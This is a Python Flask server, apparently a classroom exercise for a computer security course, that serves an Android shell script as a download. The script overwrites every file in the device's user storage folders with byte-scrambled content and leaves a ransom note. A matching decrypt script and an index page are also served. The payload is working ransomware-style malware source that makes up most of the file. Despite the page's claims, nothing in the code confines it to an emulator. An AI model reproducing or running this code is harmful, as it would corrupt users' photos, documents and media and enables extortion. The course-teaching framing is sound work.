from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

SHELL_PAYLOAD = '''#!/system/bin/sh
# SYSTEM-WIDE ENCRYPTION - ALL FILES!
# CS402M - Computer Systems Security

echo "============================================"
echo "🔒 SYSTEM-WIDE ENCRYPTION INITIATED"
echo "============================================"

# SCAN ALL LOCATIONS!
LOCATIONS="
/sdcard/Download
/sdcard/Documents
/sdcard/Pictures
/sdcard/DCIM
/sdcard/Music
/sdcard/Movies
/sdcard
"

RANSOM_FILE="/sdcard/Download/!!!_SECURITY_BREACH_READ_ME.txt"

# ============================================================
# RANSOM NOTICE
# ============================================================
echo "========================================" > $RANSOM_FILE
echo "       🔒 SECURITY BREACH - ENCRYPTION" >> $RANSOM_FILE
echo "========================================" >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "⚠️ YOUR FILES HAVE BEEN ENCRYPTED!" >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "ALL files (text, images, audio, video, etc.)" >> $RANSOM_FILE
echo "across ALL storage locations have been encrypted." >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "AFFECTED LOCATIONS:" >> $RANSOM_FILE
echo "  • Downloads" >> $RANSOM_FILE
echo "  • Documents" >> $RANSOM_FILE
echo "  • Pictures" >> $RANSOM_FILE
echo "  • DCIM (Camera)" >> $RANSOM_FILE
echo "  • Music" >> $RANSOM_FILE
echo "  • Movies" >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "🔓 TO DECRYPT:" >> $RANSOM_FILE
echo "  Contact Security Operations for decryption protocol." >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "========================================" >> $RANSOM_FILE
echo "CS402M - Computer Systems Security" >> $RANSOM_FILE
echo "========================================" >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "Your Windows PC files are COMPLETELY SAFE." >> $RANSOM_FILE
echo "Only emulator test files are affected." >> $RANSOM_FILE
echo "" >> $RANSOM_FILE
echo "SECURITY CLASSIFICATION: TOP SECRET" >> $RANSOM_FILE
echo "========================================" >> $RANSOM_FILE

echo "✅ Ransom notice created"

am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d "file://$RANSOM_FILE" > /dev/null 2>&1

# ============================================================
# ENCRYPT ALL FILES - EVERY EXTENSION!
# ============================================================
for loc in $LOCATIONS; do
    if [ -d "$loc" ]; then
        echo "📁 Scanning: $loc"
        
        # ENCRYPT ALL FILES - NOT JUST .txt!
        find "$loc" -type f ! -name "!!!_SECURITY_BREACH_READ_ME.txt" 2>/dev/null | while read -r file; do
            echo "  🔒 Encrypting: $(basename "$file")"
            
            # XOR-like encryption using od + awk
            od -An -tu1 -v "$file" | awk '
            {
                for (i = 1; i <= NF; i++) {
                    printf "%c", ($i % 2 == 0 ? $i + 1 : $i - 1)
                }
            }
            ' > "$file.temp"
            
            mv "$file.temp" "$file"
            
            am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d "file://$file" > /dev/null 2>&1
            
            echo "  ✅ Encrypted: $(basename "$file")"
        done
    fi
done

echo "============================================"
echo "✅ ENCRYPTION COMPLETE!"
echo "All files (text, images, audio, video) encrypted!"
echo "============================================"
'''

@app.route('/get-payload', methods=['GET'])
def get_payload():
    return SHELL_PAYLOAD, 200, {
        'Content-Type': 'application/x-sh',
        'Content-Disposition': 'attachment; filename="encrypt.sh"'
    }

@app.route('/get-decrypt', methods=['GET'])
def get_decrypt():
    return DECRYPT_SCRIPT, 200, {
        'Content-Type': 'application/x-sh',
        'Content-Disposition': 'attachment; filename="decrypt.sh"'
    }

DECRYPT_SCRIPT = '''#!/system/bin/sh
# DECRYPT ALL FILES
echo "============================================"
echo "🔓 DECRYPTION INITIATED"
echo "============================================"

LOCATIONS="
/sdcard/Download
/sdcard/Documents
/sdcard/Pictures
/sdcard/DCIM
/sdcard/Music
/sdcard/Movies
/sdcard
"

for loc in $LOCATIONS; do
    if [ -d "$loc" ]; then
        echo "📁 Decrypting: $loc"
        
        find "$loc" -type f ! -name "!!!_SECURITY_BREACH_READ_ME.txt" 2>/dev/null | while read -r file; do
            echo "  🔓 Decrypting: $(basename "$file")"
            
            od -An -tu1 -v "$file" | awk '
            {
                for (i = 1; i <= NF; i++) {
                    printf "%c", ($i % 2 == 0 ? $i + 1 : $i - 1)
                }
            }
            ' > "$file.temp"
            
            mv "$file.temp" "$file"
            
            am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d "file://$file" > /dev/null 2>&1
            
            echo "  ✅ Decrypted: $(basename "$file")"
        done
    fi
done

rm -f /sdcard/Download/!!!_SECURITY_BREACH_READ_ME.txt

echo "============================================"
echo "✅ DECRYPTION COMPLETE!"
echo "============================================"
'''

@app.route('/health', methods=['GET'])
def health():
    return {"status": "Encryption server running"}

@app.route('/', methods=['GET'])
def index():
    return """
    <h1>🔒 System-Wide Encryption Server</h1>
    <p>CS402M - Computer Systems Security</p>
    <div style="background-color: #ff4444; padding: 15px; border-radius: 5px; color: white;">
        <h3>⚠️ SECURITY NOTICE</h3>
        <p>This ONLY affects Android emulator storage.</p>
        <p>Your Windows PC files are COMPLETELY SAFE.</p>
    </div>
    """

if __name__ == '__main__':
    print("=" * 60)
    print("🔒 SYSTEM-WIDE ENCRYPTION SERVER")
    print("=" * 60)
    print("⚠️ This ONLY affects Android emulator storage")
    print("⚠️ Your Windows files are COMPLETELY SAFE")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True)